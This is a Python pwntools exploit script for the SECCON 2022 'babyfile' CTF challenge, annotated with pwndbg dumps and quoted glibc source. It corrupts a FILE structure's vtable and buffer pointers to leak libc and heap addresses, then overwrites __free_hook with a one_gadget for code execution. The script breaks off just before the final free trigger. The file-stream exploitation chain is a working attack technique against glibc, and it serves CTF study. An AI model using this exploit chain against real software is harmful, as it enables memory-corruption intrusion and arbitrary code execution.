#!/usr/bin/python3

from pwn import *
from pwnlib.libcdb import unstrip_libc
import ctypes

elf = ELF('chall', checksec=False)
context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

# print("UNSTRIPPING LIBC:", unstrip_libc('./libc-2.31.so')) 

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"set substitute-path /build/glibc-SzIz7B/ /media/sf_D_DRIVE/seccon_2022/babyfile",
			"brva 0x12C5",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("babyfile.seccon.games", 3157)
	else:
		return process(elf.path, env=env)

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)


def end():
	sla(b'> ', b'0')

def fflush():
	sla(b'> ', b'1')

def write(offset, data):
    assert isinstance(data, bytes)
    for ch in data:
        assert (0 <= offset <= 127) or (192 <= offset <= 255)
        sla(b'> ', b'2')
        sla(b'offset: ', b'%d' % offset)
        sla(b'value: ', b'%d' % ch)
        offset += 1

"""
pwndbg> ptype /o struct _IO_FILE_plus
/* offset      |    size */  type = struct _IO_FILE_plus {
/*      0      |     216 */    FILE file;
/*    216      |       8 */    const struct _IO_jump_t *vtable;

                               /* total size (bytes):  224 */
                             }
pwndbg> ptype /o FILE
type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }
"""

# fflush calls __GI__IO_file_sync (offset 0x60)
# pwndbg> telescope 0x7fd6d32524a0
# 00:0000│  0x7fd6d32524a0 (__GI__IO_file_jumps) ◂— 0x0
# 01:0008│  0x7fd6d32524a8 (__GI__IO_file_jumps+8) ◂— 0x0
# 02:0010│  0x7fd6d32524b0 (__GI__IO_file_jumps+16) —▸ 0x7fd6d30f8f50 (__GI__IO_file_finish) ◂— endbr64 
# 03:0018│  0x7fd6d32524b8 (__GI__IO_file_jumps+24) —▸ 0x7fd6d30f9d80 (__GI__IO_file_overflow) ◂— endbr64 
# 04:0020│  0x7fd6d32524c0 (__GI__IO_file_jumps+32) —▸ 0x7fd6d30f9a20 (__GI__IO_file_underflow) ◂— endbr64 
# 05:0028│  0x7fd6d32524c8 (__GI__IO_file_jumps+40) —▸ 0x7fd6d30faf50 (_IO_default_uflow) ◂— endbr64 
# 06:0030│  0x7fd6d32524d0 (__GI__IO_file_jumps+48) —▸ 0x7fd6d30fc680 (_IO_default_pbackfail) ◂— endbr64 
# 07:0038│  0x7fd6d32524d8 (__GI__IO_file_jumps+56) —▸ 0x7fd6d30f85d0 (__GI__IO_file_xsputn) ◂— endbr64 
# pwndbg> 
# 08:0040│  0x7fd6d32524e0 (__GI__IO_file_jumps+64) —▸ 0x7fd6d30f8240 (__GI__IO_file_xsgetn) ◂— endbr64 
# 09:0048│  0x7fd6d32524e8 (__GI__IO_file_jumps+72) —▸ 0x7fd6d30f7860 (__GI__IO_file_seekoff) ◂— endbr64 
# 0a:0050│  0x7fd6d32524f0 (__GI__IO_file_jumps+80) —▸ 0x7fd6d30fb600 (_IO_default_seekpos) ◂— endbr64 
# 0b:0058│  0x7fd6d32524f8 (__GI__IO_file_jumps+88) —▸ 0x7fd6d30f7530 (__GI__IO_file_setbuf) ◂— endbr64 
# 0c:0060│  0x7fd6d3252500 (__GI__IO_file_jumps+96) —▸ 0x7fd6d30f73c0 (__GI__IO_file_sync) ◂— endbr64 
# 0d:0068│  0x7fd6d3252508 (__GI__IO_file_jumps+104) —▸ 0x7fd6d30eac70 (_IO_file_doallocate) ◂— endbr64 
# 0e:0070│  0x7fd6d3252510 (__GI__IO_file_jumps+112) —▸ 0x7fd6d30f85a0 (_IO_file_read) ◂— endbr64 
# 0f:0078│  0x7fd6d3252518 (__GI__IO_file_jumps+120) —▸ 0x7fd6d30f7e60 (_IO_file_write@@GLIBC_2.2.5) ◂— endbr64 
# pwndbg> 
# 10:0080│  0x7fd6d3252520 (__GI__IO_file_jumps+128) —▸ 0x7fd6d30f7600 (_IO_file_seek) ◂— endbr64 
# 11:0088│  0x7fd6d3252528 (__GI__IO_file_jumps+136) —▸ 0x7fd6d30f7520 (_IO_file_close) ◂— endbr64 
# 12:0090│  0x7fd6d3252530 (__GI__IO_file_jumps+144) —▸ 0x7fd6d30f7e40 (_IO_file_stat) ◂— endbr64 
# 13:0098│  0x7fd6d3252538 (__GI__IO_file_jumps+152) —▸ 0x7fd6d30fc810 (_IO_default_showmanyc) ◂— endbr64 
# 14:00a0│  0x7fd6d3252540 (__GI__IO_file_jumps+160) —▸ 0x7fd6d30fc820 (_IO_default_imbue) ◂— endbr64 


# what we can achieve by setting low byte of vtable

#   vtable = 0x7fd6d32524a0 <__GI__IO_file_jumps>
# }
# pwndbg> telescope 0x7fd6d3252400 50
# 00:0000│  0x7fd6d3252400 (_IO_file_jumps_mmap+32) —▸ 0x7fd6d30f8ae0 (_IO_file_underflow_mmap) ◂— endbr64 
# 01:0008│  0x7fd6d3252408 (_IO_file_jumps_mmap+40) —▸ 0x7fd6d30faf50 (_IO_default_uflow) ◂— endbr64 
# 02:0010│  0x7fd6d3252410 (_IO_file_jumps_mmap+48) —▸ 0x7fd6d30fc680 (_IO_default_pbackfail) ◂— endbr64 
# 03:0018│  0x7fd6d3252418 (_IO_file_jumps_mmap+56) —▸ 0x7fd6d30f85d0 (__GI__IO_file_xsputn) ◂— endbr64 
# 04:0020│  0x7fd6d3252420 (_IO_file_jumps_mmap+64) —▸ 0x7fd6d30f7f00 (_IO_file_xsgetn_mmap) ◂— endbr64 
# 05:0028│  0x7fd6d3252428 (_IO_file_jumps_mmap+72) —▸ 0x7fd6d30f8470 (_IO_file_seekoff_mmap) ◂— endbr64 
# 06:0030│  0x7fd6d3252430 (_IO_file_jumps_mmap+80) —▸ 0x7fd6d30fb600 (_IO_default_seekpos) ◂— endbr64 
# 07:0038│  0x7fd6d3252438 (_IO_file_jumps_mmap+88) —▸ 0x7fd6d30f7560 (_IO_file_setbuf_mmap) ◂— endbr64 
# 08:0040│  0x7fd6d3252440 (_IO_file_jumps_mmap+96) —▸ 0x7fd6d30f7610 (_IO_file_sync_mmap) ◂— endbr64 
# 09:0048│  0x7fd6d3252448 (_IO_file_jumps_mmap+104) —▸ 0x7fd6d30eac70 (_IO_file_doallocate) ◂— endbr64 
# 0a:0050│  0x7fd6d3252450 (_IO_file_jumps_mmap+112) —▸ 0x7fd6d30f85a0 (_IO_file_read) ◂— endbr64 
# 0b:0058│  0x7fd6d3252458 (_IO_file_jumps_mmap+120) —▸ 0x7fd6d30f7e60 (_IO_file_write@@GLIBC_2.2.5) ◂— endbr64 
# 0c:0060│  0x7fd6d3252460 (_IO_file_jumps_mmap+128) —▸ 0x7fd6d30f7600 (_IO_file_seek) ◂— endbr64 
# 0d:0068│  0x7fd6d3252468 (_IO_file_jumps_mmap+136) —▸ 0x7fd6d30f75d0 (_IO_file_close_mmap) ◂— endbr64 
# 0e:0070│  0x7fd6d3252470 (_IO_file_jumps_mmap+144) —▸ 0x7fd6d30f7e40 (_IO_file_stat) ◂— endbr64 
# 0f:0078│  0x7fd6d3252478 (_IO_file_jumps_mmap+152) —▸ 0x7fd6d30fc810 (_IO_default_showmanyc) ◂— endbr64 
# 10:0080│  0x7fd6d3252480 (_IO_file_jumps_mmap+160) —▸ 0x7fd6d30fc820 (_IO_default_imbue) ◂— endbr64 
# 11:0088│  0x7fd6d3252488 ◂— 0x0
# ... ↓     4 skipped
# 16:00b0│  0x7fd6d32524b0 (__GI__IO_file_jumps+16) —▸ 0x7fd6d30f8f50 (__GI__IO_file_finish) ◂— endbr64 
# 17:00b8│  0x7fd6d32524b8 (__GI__IO_file_jumps+24) —▸ 0x7fd6d30f9d80 (__GI__IO_file_overflow) ◂— endbr64 
# 18:00c0│  0x7fd6d32524c0 (__GI__IO_file_jumps+32) —▸ 0x7fd6d30f9a20 (__GI__IO_file_underflow) ◂— endbr64 
# 19:00c8│  0x7fd6d32524c8 (__GI__IO_file_jumps+40) —▸ 0x7fd6d30faf50 (_IO_default_uflow) ◂— endbr64 
# 1a:00d0│  0x7fd6d32524d0 (__GI__IO_file_jumps+48) —▸ 0x7fd6d30fc680 (_IO_default_pbackfail) ◂— endbr64 
# 1b:00d8│  0x7fd6d32524d8 (__GI__IO_file_jumps+56) —▸ 0x7fd6d30f85d0 (__GI__IO_file_xsputn) ◂— endbr64 
# 1c:00e0│  0x7fd6d32524e0 (__GI__IO_file_jumps+64) —▸ 0x7fd6d30f8240 (__GI__IO_file_xsgetn) ◂— endbr64 
# 1d:00e8│  0x7fd6d32524e8 (__GI__IO_file_jumps+72) —▸ 0x7fd6d30f7860 (__GI__IO_file_seekoff) ◂— endbr64 
# 1e:00f0│  0x7fd6d32524f0 (__GI__IO_file_jumps+80) —▸ 0x7fd6d30fb600 (_IO_default_seekpos) ◂— endbr64 
# 1f:00f8│  0x7fd6d32524f8 (__GI__IO_file_jumps+88) —▸ 0x7fd6d30f7530 (__GI__IO_file_setbuf) ◂— endbr64 
# 20:0100│  0x7fd6d3252500 (__GI__IO_file_jumps+96) —▸ 0x7fd6d30f73c0 (__GI__IO_file_sync) ◂— endbr64 
# 21:0108│  0x7fd6d3252508 (__GI__IO_file_jumps+104) —▸ 0x7fd6d30eac70 (_IO_file_doallocate) ◂— endbr64 
# 22:0110│  0x7fd6d3252510 (__GI__IO_file_jumps+112) —▸ 0x7fd6d30f85a0 (_IO_file_read) ◂— endbr64 
# 23:0118│  0x7fd6d3252518 (__GI__IO_file_jumps+120) —▸ 0x7fd6d30f7e60 (_IO_file_write@@GLIBC_2.2.5) ◂— endbr64 
# 24:0120│  0x7fd6d3252520 (__GI__IO_file_jumps+128) —▸ 0x7fd6d30f7600 (_IO_file_seek) ◂— endbr64 
# 25:0128│  0x7fd6d3252528 (__GI__IO_file_jumps+136) —▸ 0x7fd6d30f7520 (_IO_file_close) ◂— endbr64 
# 26:0130│  0x7fd6d3252530 (__GI__IO_file_jumps+144) —▸ 0x7fd6d30f7e40 (_IO_file_stat) ◂— endbr64 
# 27:0138│  0x7fd6d3252538 (__GI__IO_file_jumps+152) —▸ 0x7fd6d30fc810 (_IO_default_showmanyc) ◂— endbr64 
# 28:0140│  0x7fd6d3252540 (__GI__IO_file_jumps+160) —▸ 0x7fd6d30fc820 (_IO_default_imbue) ◂— endbr64 
# 29:0148│  0x7fd6d3252548 ◂— 0x0
# ... ↓     4 skipped
# 2e:0170│  0x7fd6d3252570 (_IO_str_jumps+16) —▸ 0x7fd6d30fcd50 (_IO_str_finish) ◂— endbr64 
# 2f:0178│  0x7fd6d3252578 (_IO_str_jumps+24) —▸ 0x7fd6d30fc9b0 (_IO_str_overflow) ◂— endbr64 
# 30:0180│  0x7fd6d3252580 (_IO_str_jumps+32) —▸ 0x7fd6d30fc950 (_IO_str_underflow) ◂— endbr64 
# 31:0188│  0x7fd6d3252588 (_IO_str_jumps+40) —▸ 0x7fd6d30faf50 (_IO_default_uflow) ◂— endbr64 


# use _IO_default_pbackfail to set some pointers

"""
int
_IO_default_pbackfail (FILE *fp, int c)
{
  if (fp->_IO_read_ptr > fp->_IO_read_base && !_IO_in_backup (fp)
      && (unsigned char) fp->_IO_read_ptr[-1] == c)
    --fp->_IO_read_ptr;
  else
    {
      /* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/
      if (!_IO_in_backup (fp))
	{
	  /* We need to keep the invariant that the main get area
	     logically follows the backup area.  */
	  if (fp->_IO_read_ptr > fp->_IO_read_base && _IO_have_backup (fp))
	    {
	      if (save_for_backup (fp, fp->_IO_read_ptr))
		return EOF;
	    }
	  else if (!_IO_have_backup (fp))
	    {
	      /* No backup buffer: allocate one. */
	      /* Use nshort buffer, if unused? (probably not)  FIXME */
	      int backup_size = 128;
	      char *bbuf = (char *) malloc (backup_size);
	      if (bbuf == NULL)
		return EOF;
	      fp->_IO_save_base = bbuf;
	      fp->_IO_save_end = fp->_IO_save_base + backup_size;
	      fp->_IO_backup_base = fp->_IO_save_end;
	    }
	  fp->_IO_read_base = fp->_IO_read_ptr;
	  _IO_switch_to_backup_area (fp);
	}
      else if (fp->_IO_read_ptr <= fp->_IO_read_base)
	{
	  /* Increase size of existing backup buffer. */
	  size_t new_size;
	  size_t old_size = fp->_IO_read_end - fp->_IO_read_base;
	  char *new_buf;
	  new_size = 2 * old_size;
	  new_buf = (char *) malloc (new_size);
	  if (new_buf == NULL)
	    return EOF;
	  memcpy (new_buf + (new_size - old_size), fp->_IO_read_base,
		  old_size);
	  free (fp->_IO_read_base);
	  _IO_setg (fp, new_buf, new_buf + (new_size - old_size),
		    new_buf + new_size);
	  fp->_IO_backup_base = fp->_IO_read_ptr;
	}

      *--fp->_IO_read_ptr = c;
    }
  return (unsigned char) c;
}
"""

li("Leaking libc...")

# 1a:00d0│  0x7fd6d32524d0 (__GI__IO_file_jumps+48) —▸ 0x7fd6d30fc680 (_IO_default_pbackfail) ◂— endbr64 

write(216, p8(0xd0-0x60))
fflush()

# $6 = {
#   file = {
#     _flags = 0xfbad2588,
#     _IO_read_ptr = 0x562a557ba4ff <incomplete sequence \320>,
#     _IO_read_end = 0x562a557ba500 "",
#     _IO_read_base = 0x562a557ba480 "",

"""
int
_IO_new_file_overflow (FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
	{
	  _IO_doallocbuf (f);
	  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	}
      /* Otherwise must be currently reading.
	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
	 logically slide the buffer forwards one block (by setting the
	 read pointers to all point at the beginning of the block).  This
	 makes room for subsequent output.
	 Otherwise, set the read pointers to _IO_read_end (leaving that
	 alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
	{
	  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
	  _IO_free_backup_area (f);
	  f->_IO_read_base -= MIN (nbackup,
				   f->_IO_read_base - f->_IO_buf_base);
	  f->_IO_read_ptr = f->_IO_read_base;
	}

      if (f->_IO_read_ptr == f->_IO_buf_end)
	f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_IO_write_end = f->_IO_write_ptr;
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
"""

# __GI__IO_file_overflow
write(216, p8(0xb8-0x60))

#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_UNBUFFERED        0x0002
#define _IO_LINE_BUF          0x0200


# if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
# if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
# if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
flags = 0xfbad24a8
flags &= ~0x0008 & (2**32-1)
flags &= ~0x0800 & (2**32-1)
flags |= 0x0200
write(0, p32(flags))

# if (f->_IO_write_base == NULL)
write(32, p8(1))
fflush()

"""
pwndbg> p *f
$1 = {
  _flags = 0xfbad2ea0,
  _IO_read_ptr = 0x55820a319500 "",
  _IO_read_end = 0x55820a319500 "",
  _IO_read_base = 0x55820a319500 "",
  _IO_write_base = 0x55820a3194ff "\270",
  _IO_write_ptr = 0x55820a319500 "",
  _IO_write_end = 0x55820a3194ff "\270",
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x55820a319500 "",
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x7f79cb1dd5c0 <_IO_2_1_stderr_>,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = 0x55820a319380,
  _offset = 0xffffffffffffffff,
  _codecvt = 0x0,
  _wide_data = 0x0,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' <repeats 19 times>
}
"""



# leak some pointers

"""
int
_IO_new_file_sync (FILE *fp)
{
  ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_do_flush(fp)) return EOF;
  delta = fp->_IO_read_ptr - fp->_IO_read_end;
  if (delta != 0)
    {
      off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
      if (new_pos != (off64_t) EOF)
	fp->_IO_read_end = fp->_IO_read_ptr;
      else if (errno == ESPIPE)
	; /* Ignore error from unseekable devices. */
      else
	retval = EOF;
    }
  if (retval != EOF)
    fp->_offset = _IO_pos_BAD;
  /* FIXME: Cleanup - can this be shared? */
  /*    setg(base(), ptr, ptr); */
  return retval;
}
libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)

int
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
"""

#define _IO_IS_APPENDING      0x1000

write(216, p8(0xa0)) 						# restore vtable
write(32, p8(00)) 							# set last byte _IO_write_base to zero
write(112, p8(constants.STDOUT_FILENO))		# set fileno to 1

flags = 0xfbad2ea0
flags |= 0x1000
write(0, p32(flags))

fflush()

trash = r(0x70)
libc_leak = u64(r(8))
ls(f'libc_leak {libc_leak:#x}')

libc = ELF("./libc-2.31.so")
libc.address = libc_leak - 0x1e8f60
ls(f'libc.address {libc.address:#x}')


"""
pwndbg> ptype /o main_arena
/* offset      |    size */  type = struct malloc_state {
/*      0      |       4 */    __libc_lock_t mutex;
/*      4      |       4 */    int flags;
/*      8      |       4 */    int have_fastchunks;
/* XXX  4-byte hole      */
/*     16      |      80 */    mfastbinptr fastbinsY[10];
/*     96      |       8 */    mchunkptr top;
/*    104      |       8 */    mchunkptr last_remainder;
/*    112      |    2032 */    mchunkptr bins[254];
/*   2144      |      16 */    unsigned int binmap[4];
/*   2160      |       8 */    struct malloc_state *next;
/*   2168      |       8 */    struct malloc_state *next_free;
/*   2176      |       8 */    size_t attached_threads;
/*   2184      |       8 */    size_t system_mem;
/*   2192      |       8 */    size_t max_system_mem;

                               /* total size (bytes): 2200 */
                             }
"""
# leak heap addr

li("Leaking heap addr...")


write(32, p64(libc.sym['main_arena'] + 96)) 				# set _IO_write_base
write(40, p64(libc.sym['main_arena'] + 96 + 8)) 			# set _IO_write_ptr

flags = 0xfbad2ea0
flags |= 0x1000
write(0, p32(flags))
fflush()

heap_leak = u64(r(8))
ls(f'heap_leak {heap_leak:#x}')

heap_base = heap_leak - 0x500
ls(f'heap_base {heap_base:#x}')


# do arbitrary write

# _IO_file_xsgetn won't work because it calls _IO_UNDERFLOW and it crashes, because vtable is broken :(

"""
int
__underflow (FILE *fp)
{
  if (_IO_vtable_offset (fp) == 0 && _IO_fwide (fp, -1) != -1)
    return EOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, -1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_get_mode (fp) == EOF)
      return EOF;
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
  if (_IO_in_backup (fp))
    {
      _IO_switch_to_main_get_area (fp);
      if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *) fp->_IO_read_ptr;
    }
  if (_IO_have_markers (fp))
    {
      if (save_for_backup (fp, fp->_IO_read_end))
	return EOF;
    }
  else if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  return _IO_UNDERFLOW (fp);
}
libc_hidden_def (__underflow)
"""

# so we are going to use _IO_default_pbackfail to call save_for_backup

"""
int
_IO_default_pbackfail (FILE *fp, int c)
{
  if (fp->_IO_read_ptr > fp->_IO_read_base && !_IO_in_backup (fp)
      && (unsigned char) fp->_IO_read_ptr[-1] == c)
    --fp->_IO_read_ptr;
  else
    {
      /* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/
      if (!_IO_in_backup (fp))
	{
	  /* We need to keep the invariant that the main get area
	     logically follows the backup area.  */
	  if (fp->_IO_read_ptr > fp->_IO_read_base && _IO_have_backup (fp))
	    {
	      if (save_for_backup (fp, fp->_IO_read_ptr))
		return EOF;
	    }
	  else if (!_IO_have_backup (fp))
	    {
	      /* No backup buffer: allocate one. */
	      /* Use nshort buffer, if unused? (probably not)  FIXME */
	      int backup_size = 128;
	      char *bbuf = (char *) malloc (backup_size);
	      if (bbuf == NULL)
		return EOF;
	      fp->_IO_save_base = bbuf;
	      fp->_IO_save_end = fp->_IO_save_base + backup_size;
	      fp->_IO_backup_base = fp->_IO_save_end;
	    }
	  fp->_IO_read_base = fp->_IO_read_ptr;
	  _IO_switch_to_backup_area (fp);
	}
      else if (fp->_IO_read_ptr <= fp->_IO_read_base)
	{
	  /* Increase size of existing backup buffer. */
	  size_t new_size;
	  size_t old_size = fp->_IO_read_end - fp->_IO_read_base;
	  char *new_buf;
	  new_size = 2 * old_size;
	  new_buf = (char *) malloc (new_size);
	  if (new_buf == NULL)
	    return EOF;
	  memcpy (new_buf + (new_size - old_size), fp->_IO_read_base,
		  old_size);
	  free (fp->_IO_read_base);
	  _IO_setg (fp, new_buf, new_buf + (new_size - old_size),
		    new_buf + new_size);
	  fp->_IO_backup_base = fp->_IO_read_ptr;
	}

      *--fp->_IO_read_ptr = c;
    }
  return (unsigned char) c;
}
libc_hidden_def (_IO_default_pbackfail)

static int
save_for_backup (FILE *fp, char *end_p)
{
  /* Append [_IO_read_base..end_p] to backup area. */
  ssize_t least_mark = _IO_least_marker (fp, end_p);
  /* needed_size is how much space we need in the backup area. */
  size_t needed_size = (end_p - fp->_IO_read_base) - least_mark;
  /* FIXME: Dubious arithmetic if pointers are NULL */
  size_t current_Bsize = fp->_IO_save_end - fp->_IO_save_base;
  size_t avail; /* Extra space available for future expansion. */
  ssize_t delta;
  struct _IO_marker *mark;
  if (needed_size > current_Bsize)
    {
      char *new_buffer;
      avail = 100;
      new_buffer = (char *) malloc (avail + needed_size);
      if (new_buffer == NULL)
	return EOF;		/* FIXME */
      if (least_mark < 0)
	{
	  __mempcpy (__mempcpy (new_buffer + avail,
				fp->_IO_save_end + least_mark,
				-least_mark),
		     fp->_IO_read_base,
		     end_p - fp->_IO_read_base);
	}
      else
	memcpy (new_buffer + avail,
		fp->_IO_read_base + least_mark,
		needed_size);
      free (fp->_IO_save_base);
      fp->_IO_save_base = new_buffer;
      fp->_IO_save_end = new_buffer + avail + needed_size;
    }
  else
    {
      avail = current_Bsize - needed_size;
      if (least_mark < 0)
	{
	  memmove (fp->_IO_save_base + avail,
		   fp->_IO_save_end + least_mark,
		   -least_mark);
	  memcpy (fp->_IO_save_base + avail - least_mark,
		  fp->_IO_read_base,
		  end_p - fp->_IO_read_base);
	}
      else if (needed_size > 0)
	memcpy (fp->_IO_save_base + avail,
		fp->_IO_read_base + least_mark,
		needed_size);
    }
  fp->_IO_backup_base = fp->_IO_save_base + avail;
  /* Adjust all the streammarkers. */
  delta = end_p - fp->_IO_read_base;
  for (mark = fp->_markers; mark != NULL; mark = mark->_next)
    mark->_pos -= delta;
  return 0;
}
"""

li("Overwriting __free_hook")

write(216, p64(libc.sym['_IO_str_jumps']+48-0x60))

#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */

flags = 0xfbad24a8
flags &= ~0x0800 & (2**32-1)
flags &= ~0x0008 & (2**32-1)
write(0, p32(flags))

# conditions
# fp->_IO_read_ptr >= fp->_IO_read_end
# _IO_save_base != NULL

# setup for memcpy
write(24, p64(heap_base + 0x364)) 				# _IO_read_base
write(72, p64(libc.sym['__free_hook']))     	# _IO_save_base
write(88, p64(libc.sym['__free_hook'] + 16))     # _IO_save_end
one_gadget = libc.address + 0xe3b01
write(196, p64(one_gadget))         			# heap_base + 0x360
ls(f'one_gadget: {one_gadget:#x}')

write(16, p64(heap_base + 0x364 + 16)) 			# _IO_read_end
write(8, p64(heap_base + 0x364 + 16)) 			# _IO_read_ptr


# create fake marker with _next = 0, _pos = ?
# struct _IO_marker {
#   struct _IO_marker *_next;
#   FILE *_sbuf;
#   /* If _pos >= 0
#  it points to _buf->Gbase()+_pos. FIXME comment */
#   /* if _pos < 0, it points to _buf->eBptr()+_pos. FIXME comment */
#   int _pos;
# };

write(96, p64(heap_base + 0x390)) 		# struct _IO_marker *_markers;
# all fields zeroed

fflush()

# free_hook is set to one_gadget
# trigger free by calling _IO_new_file_finish

"""
void
_IO_new_file_finish (FILE *fp, int dummy)
{
  if (_IO_file_is_open (fp))
    {
      _IO_do_flush (fp);
      if (!(fp->_flags & _IO_DELETE_DONT_CLOSE))
	_IO_SYSCLOSE (fp);
    }
  _IO_default_finish (fp, 0);
}
libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)

void
_IO_default_finish (FILE *fp, int dummy)
{
  struct _IO_marker *mark;
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    {
      free (fp->_IO_buf_base);
      fp->_IO_buf_base = fp->_IO_buf_end = NULL;
    }

  for (mark = fp->_markers; mark != NULL; mark = mark->_next)
    mark->_sbuf = NULL;

  if (fp->_IO_save_base)
    {
      free (fp->_IO_save_base);
      fp->_IO_save_base = NULL;
    }

  _IO_un_link ((struct _IO_FILE_plus *) fp);

#ifdef _IO_MTSAFE_IO
  if (fp->_lock != NULL)
    _IO_lock_fini (*fp->_lock);
#endif
}
libc_hidden_def (_IO_default_finish)
"""

li("Triggering free...")


#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */

